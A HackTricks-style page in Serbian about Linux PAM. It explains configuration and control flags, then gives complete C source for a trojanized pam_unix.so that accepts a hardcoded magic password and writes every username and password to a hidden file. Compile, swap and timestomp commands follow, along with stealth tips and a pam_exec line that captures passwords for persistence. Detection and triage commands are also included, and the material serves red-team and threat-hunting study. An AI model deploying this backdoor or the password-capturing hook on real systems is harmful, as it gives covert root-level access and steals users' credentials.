# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Osnovne informacije

**PAM (Pluggable Authentication Modules)** je bezbednosni mehanizam koji **proverava identitet korisnika koji pokušavaju da pristupe računarskim uslugama** i kontroliše njihov pristup na osnovu različitih kriterijuma. Slično je digitalnom čuvaru kapije: osigurava da samo ovlašćeni korisnici mogu da koriste određene usluge, a može i da ograniči njihovo korišćenje kako bi sprečio preopterećenje sistema.

#### Konfiguracione datoteke

- **Solaris** podržava zastarelu centralnu datoteku `/etc/pam.conf`, ali se prema aktuelnim smernicama prednost daje datotekama za pojedinačne usluge u `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Linux sistemi** prednost daju pristupu zasnovanom na direktorijumu, pri čemu se konfiguracije za pojedinačne usluge čuvaju u `/etc/pam.d`. Na primer, konfiguraciona datoteka za uslugu login nalazi se u `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Primer PAM konfiguracije za uslugu login mogao bi da izgleda ovako:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **Oblasti upravljanja PAM-om**

Ove oblasti, odnosno grupe za upravljanje, obuhvataju **auth**, **account**, **password** i **session**, a svaka je odgovorna za različite aspekte procesa autentifikacije i upravljanja sesijama:<sup>[[1]](#references)</sup>

- **Auth**: Proverava identitet korisnika, često tako što traži lozinku.
- **Account**: Obavlja proveru naloga, proveravajući uslove kao što su članstvo u grupi ili vremenska ograničenja.
- **Password**: Upravljanja ažuriranjem lozinki, uključujući proveru složenosti i sprečavanje napada rečnikom.
- **Session**: Upravlja radnjama pri pokretanju ili završetku sesije servisa, kao što su montiranje direktorijuma ili postavljanje ograničenja resursa.

#### **Kontrole PAM modula**

Kontrole određuju kako modul reaguje na uspeh ili neuspeh, utičući na celokupan proces autentifikacije. One obuhvataju:<sup>[[1]](#references)</sup>

- **Required**: Neuspeh obaveznog modula na kraju dovodi do neuspeha, ali tek pošto se provere svi naredni moduli.
- **Requisite**: Odmah prekida proces u slučaju neuspeha.
- **Sufficient**: Ako nijedan prethodni modul `required` nije zakazao, uspeh odmah završava obradu i preskače preostale module u istoj grupi za upravljanje.
- **Optional**: Dovodi do neuspeha samo ako je jedini modul u nizu.

#### Ofanzivna semantika koja je važna

Pri analizi ili izmeni PAM-a, **mesto umetanja pravila** određuje koji stek ga obrađuje:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` i `substack` uključuju pravila iz drugih datoteka, pa izmena `sshd`-a može uticati samo na SSH, dok izmena `system-auth`, `common-auth` ili drugog zajedničkog steka može uticati na više servisa odjednom.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM podržava i kontrole u uglastim zagradama, kao što je `[success=1 default=ignore]`. One se mogu zloupotrebiti za **preskakanje jednog ili više modula** nakon uspešne prilagođene provere, umesto da se vidljivo zameni `pam_unix.so`.<sup>[[1]](#references)</sup>
- `module-path` može biti **apsolutna putanja** (`/usr/lib/security/pam_custom.so`) ili **relativna** u odnosu na podrazumevani direktorijum PAM modula. Na savremenim Linux sistemima stvarni direktorijumi su često `/lib/security`, `/lib64/security`, `/usr/lib/security` ili multiarch putanje kao što je `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Kratak savet za operatere: pre izmena uvek mapirajte **ceo graf servisa**. Na primer, `sshd -> password-auth -> system-auth` na nekim distribucijama, ili `sshd -> system-remote-login -> system-login -> system-auth` na drugima, znači da isti jednolinijski implant može imati znatno širi domet od planiranog.<sup>[[1]](#references)[[13]](#references)</sup>

Prilagođeni modul `auth` može dodati interaktivni izazov za `sudo` nakon lozinke naloga. Pregledajte efektivni stek u `/etc/pam.d/sudo`, uključenu politiku, argumente modula i dozvole za sve navedene lokalne datoteke pre nego što ručno proverite izazov. Sama čitljiva lista reči za izazov ne zaobilazi proveru lozinke niti dodaje sudoers ovlašćenje. Za privilegovani prelaz i dalje su potrebni ispravna autentifikacija naloga, uspešno izvršavanje svih obaveznih koraka PAM-a i sudo pravilo koje dozvoljava rad kao root; automatizovano enumerisanje ne bi trebalo da pokrene izazov.

Za ranjivost vlasništva nad `pam_motd` u starijem Ubuntu sistemu ([CVE-2010-0832](https://ubuntu.com/security/cve-2010-0832)), proverite stvarnu verziju izgradnje paketa `libpam-modules` i da li neka prijavna usluga poziva pogođeni session modul. Ubuntu je ispravio ranjivost u verziji **1.1.0-2ubuntu1.1** za 9.10 i **1.1.1-2ubuntu5** za 10.04 LTS; za druga izdanja ili zakrpe koje su dobavljači preneli unazad potrebna je zasebna procena paketa. Opisani put napada zahtevao je da pozivalac zameni svoj `.cache` u početnom direktorijumu simboličkom vezom, a zatim pokrene PAM prijavu, zbog čega bi stari modul promenio vlasništvo nad zaštićenom metom. Sama stavka `.cache`, linija `pam_motd.so` ili stara verzija kernela ne dokazuju izloženost; proverite kontrolu nad početnim direktorijumom, efektivnu verziju modula, mogućnost dostizanja prijave, obradu simboličkih veza i dozvole mete, bez zamene datoteka ili pokretanja prijave tokom pasivnog enumerisanja. Pogledajte [Ubuntu-ovo bezbednosno obaveštenje](https://ubuntu.com/security/notices/USN-959-1).

#### Primer scenarija

U postavci sa više auth modula, proces se odvija po strogom redosledu. Ako modul `pam_securetty` utvrdi da terminal za prijavu nije ovlašćen, prijave root korisnika se blokiraju, ali se svi moduli i dalje obrađuju zbog njegovog statusa „required“. Modul `pam_env` postavlja promenljive okruženja, što potencijalno može poboljšati korisničko iskustvo. Moduli `pam_ldap` i `pam_unix` zajednički autentifikuju korisnika, pri čemu `pam_unix` pokušava da iskoristi prethodno unetu lozinku, čime se povećavaju efikasnost i fleksibilnost metoda autentifikacije.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` у сервисном стеку

`pam_permit.so` враћа успех за PAM провере. Ако корисник са нижим привилегијама може да измени ефективну PAM политику неког сервиса, уметање овог модула са контролном заставицом која прекида стек аутентификације може уклонити проверу лозинке за тај сервис. За `sudo` прегледајте `/etc/pam.d/sudo` и све укључене датотеке `common-auth` или `system-auth` пре него што одлучите на које сервисе то утиче. Заобилажење PAM аутентификације **не** додељује ново sudoers правило; корисник и даље мора бити овлашћен да покрене тражену команду. Проверите редослед правила и евентуалне раније неуспехе модула `required`, уместо да претпоставите да једна линија `sufficient pam_permit.so` увек омогућава приступ.

## Backdooring PAM – Hooking `pam_unix.so`

Класичан трик за одржавање постојаности у критичним Linux окружењима јесте **замена легитимне PAM библиотеке тројанизованом заменском библиотеком**. На хосту чији PAM стек учитава `pam_unix.so`, SSH или пријава преко конзоле могу позвати његову улазну тачку `pam_sm_authenticate()`; злонамерна замена може да украде акредитиве или омогући заобилажење провере помоћу *магичне* лозинке.<sup>[[2]](#references)[[11]](#references)</sup>

### Подсетник за компајлирање
Доња скица користи улазну тачку сервиса Linux-PAM-а `pam_sm_authenticate()` и `pam_get_authtok()` за приступ токену за аутентификацију.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Пример тројанизованог `pam_unix.so` модула</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Kompajlirajte i neprimetno zamenite (obrazac zamene/timestomp tehnike dokumentovao je Unit 42). Prilagodite i putanju rezervne kopije hardkodiranu u wrapperu i komande ispod stvarnom direktorijumu PAM modula na ciljnom sistemu:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### OpSec saveti
1. **Atomsko prepisivanje** – upišite celu biblioteku u privremenu datoteku, pa je preimenujte na željeno mesto da ne biste ostavili delimično upisan modul za autentifikaciju.
2. Putanja kao što je `/usr/bin/.dbus.log` uočena je u Unit 42 analizi AuthDoor-a, pa je korisna i kao indikator za hunting.<sup>[[2]](#references)</sup>
3. Sačuvajte ulazne tačke koje očekuje PAM stek (na primer, `pam_sm_authenticate` i `pam_sm_setcred`) kako bi ostale operacije upravljanja nastavile da rade.<sup>[[11]](#references)[[18]](#references)</sup>

### Detekcija
Pri proveri integriteta paketa, RPM proverava metapodatke instaliranih datoteka, `debsums -s` prijavljuje greške kontrolnih suma, a `dpkg -S` u triage bloku proverava vlasništvo nad paketom; sintaksa audit watch beleži upise i promene atributa na putanji.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Uporedite MD5/SHA256 vrednosti za `pam_unix.so` sa paketom distribucije.
* Koristite `rpm -V pam` ili `debsums -s libpam-modules` da biste otkrili zamenjene biblioteke bez ručnog računanja hash vrednosti.
* Proverite da li postoje dozvole za upis svim korisnicima ili neuobičajeno vlasništvo u direktorijumu `/lib/security/`.
* Pravilo za `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Pretražite PAM konfiguracije u potrazi za neočekivanim modulima: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Ova `pam_` pretraga ne pronalazi prilagođene module sa drugačijim imenima `.so` datoteka. Pregledajte **aktivne** linije `auth`, `account`, `password` i `session` u direktorijumu `/etc/pam.d` (i u datoteci `/etc/pam.conf` gde se koristi), uključujući njihove kontrolne zastavice i sve uključene stekove. Nepoznat modul postavljen kao `auth sufficient` pre uobičajene provere lozinke zaslužuje proveru vlasništva nad paketom i analizu binarne datoteke; [PAM's control syntax](https://man7.org/linux/man-pages/man5/pam.d.5.html) može omogućiti da uspešna provera rano završi taj deo steka. Sam naziv modula, neuobičajena vremenska oznaka ili opcija `nodelay` sami po sebi ne dokazuju zaobilaženje provere. Ako ponašanje ukazuje na vremenski leak, prvo proverite implementaciju i dostupnost servisa; tokom rutinskog enumerisanja nemojte više puta slati pokušaje autentifikacije.

### Brze triage komande (nakon kompromitacije ili za threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Zloupotreba `pam_exec` za postojanost
Umesto zamene `pam_unix.so`, manje invazivan pristup je da se doda linija `pam_exec` u `/etc/pam.d/sshd`, tako da poziv koji dođe do te PAM linije pokrene pomoćni program, a da se pritom uobičajeni stek ne menja.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` prima PAM metapodatke u promenljivama okruženja kao što su `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` i `PAM_TYPE`. Uz `expose_authtok`, pomoćni program može da pročita do `PAM_MAX_RESP_SIZE` bajtova lozinke sa `stdin` tokom faze `auth` ili `password`. Ako želite da se pomoćni program pokreće sa efektivnim UID-om umesto stvarnim UID-om, dodajte `seteuid`.<sup>[[4]](#references)</sup>

Praktične napomene prate tipove modula i filter `type=` dokumentovane za `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` je bolji izbor za **radnje nakon prijavljivanja**, kao što su ponovno otvaranje soketa ili pokretanje odvojenog demona.
- `auth optional pam_exec.so quiet expose_authtok ...` uobičajen je izbor za **hvatanje kredencijala**, jer se pokreće pre otvaranja sesije.
- `type=session` ili `type=auth` mogu da se koriste za ograničavanje izvršavanja na određenu PAM fazu i izbegavanje nepotrebnog dvostrukog izvršavanja.

Pri pregledu privilegija, apsolutna putanja do pomoćnog programa `pam_exec.so` u koju trenutni korisnik može da upisuje predstavlja mogući problem čak i kada je datoteka označena kao append-only (`a`): [atribut dozvoljava dodavanje sadržaja](https://man7.org/linux/man-pages/man1/chattr.1.html), što može biti dovoljno da se izmeni kasnije ponašanje shell skripte. Najpre proverite da li PAM servis i događaj zaista dolaze do te linije, da li su pomoćni program i njegova nadređena putanja pouzdani i da li se komanda izvršava pod privilegovanim identitetom; [`seteuid` menja koji PAM UID se koristi](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Sama činjenica da je datoteka upisiva ili rezultat komande `lsattr` ne dokazuje izvršavanje sa privilegijama.

### Opstajanje kroz distro alate: `authselect`

Na sistemima iz porodice RHEL i Fedora koji koriste `authselect`, direktne izmene generisanih datoteka kao što su `/etc/pam.d/system-auth` ili `/etc/pam.d/password-auth` mogu biti **prepisane alatom `authselect`**. Radi opstajanja izmena, administratori često menjaju aktivni prilagođeni profil u `/etc/authselect/custom/<profile>/`, a zatim ga ponovo izaberu.<sup>[[5]](#references)[[19]](#references)</sup>

Uobičajen postupak kada imate root privilegije:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Ovo je važno i za ofanzivu i za trijažu: ako `/etc/pam.d/system-auth` sadrži baner `Generated by authselect` i `Do not modify this file manually`, stvarna tačka postojanosti možda se nalazi u `/etc/authselect/custom/`, a ne u `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Nedavni tradecraft uočen u praksi

Nedavni izveštaji iz 2025. o Linux backdoor-u **Plague** pokazali su istu osnovnu ideju u naprednijem obliku: zlonamernu PAM komponentu sa **statičkom lozinkom za zaobilaženje provere**, uz uklanjanje SSH promenljivih okruženja i istorije shell-a (`HISTFILE=/dev/null`) radi smanjenja tragova sesije nakon prijavljivanja.<sup>[[3]](#references)</sup> Ovo je koristan obrazac za lov na pretnje jer logika backdoor-a može biti smeštena u PAM-u, dok se artefakti prikrivanja pojavljuju tek **nakon** uspešne autentifikacije.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Priručnik tajnog operativca: infiltracija globalnih telekomunikacionih mreža - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: novootkriveni PAM-based backdoor za Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Konfigurisanje autentifikacije korisnika pomoću authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian stranice priručnika](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian stranice priručnika](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Upravljanje autentifikacijom u Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Vodič za autentifikaciju na nivou sistema - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Lista datoteka Ubuntu paketa: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian stranice priručnika](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Changes/Obavezna upotreba Authselect-a - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
